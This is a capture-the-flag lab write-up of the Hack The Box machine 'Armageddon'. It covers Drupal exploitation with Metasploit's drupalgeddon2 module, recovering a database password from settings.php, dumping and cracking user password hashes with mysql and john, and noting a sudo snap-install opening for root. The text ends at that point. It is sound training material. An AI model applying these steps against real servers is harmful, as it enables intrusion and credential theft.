# Armageddon
IP = 10.10.10.233

nmap scan show us two ports 

|port|service|
|----|----|
|22/tcp|ssh|
|80/tcp|http|


look up web service we see a simple page with login promt, creating an account require admin approvel.
lets look at the page source code. 

After alot of googling I find something about Drupal, an open-source web content management framework written in php
http://10.10.10.233/misc/drupal.js?qkrkcw

doing a quick search in metasploit lead me to a possible exploit 
exploit/unix/webapp/drupal_drupalgeddon2 

using show options display the information the exploit needs. 
fillout the rhost parameter and remeber to change lhost to your htb ip adress. 

Trying to elevate my shell with python did not work, and reading user file did not either, time to emulate for information. 
In the file setting.php I fould a password and username to database.
 ````text
      'username' => 'drupaluser',
      'password' => 'CQHEy@9M*m23gBVj',

````

But no user found with that name. 
But the machine have mysql installed lets try and see it we can gain anything from that. 

mysql \-u drupaluser \-pCQHEy@9M\*m23gBVj \-D drupal \-e 'show tables;'
By first displaying the tables I find a table with the name user

mysql \-u drupaluser \-pCQHEy@9M\*m23gBVj \-D drupal \-e 'select name,pass from users;'

brucetherealadmin       $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt

The user i created. 
test123  $S$DZx1b6bodwib0h4J1yLVg86Qn8sPoYlkFQW..4N/231N4VDAPxjF

Cracking the password 
Basic john with rockyou.txt 
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
brucetherealadmin : booboo

let ssh in with that user.
And we got the user flag.

## root
I always try by doing sudo -l to see if there are any command I can run as root without password and luckly there is 
/usr/bin/snap install *
